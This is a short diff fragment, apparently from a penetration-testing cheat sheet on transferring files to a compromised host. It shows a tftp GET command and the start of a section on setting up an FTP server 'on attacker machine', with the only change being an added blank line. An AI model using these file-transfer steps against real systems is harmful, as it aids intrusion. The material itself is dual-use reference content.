@@ -139,6 +139,7 @@ Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB t
 	tftp -i <[IP]> GET <[FILE]>
 	
 <b>FTP</b> (Windows operating systems contain a default FTP client that can also be used for file transfer)
+
 On attacker machine:
 
 	(UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
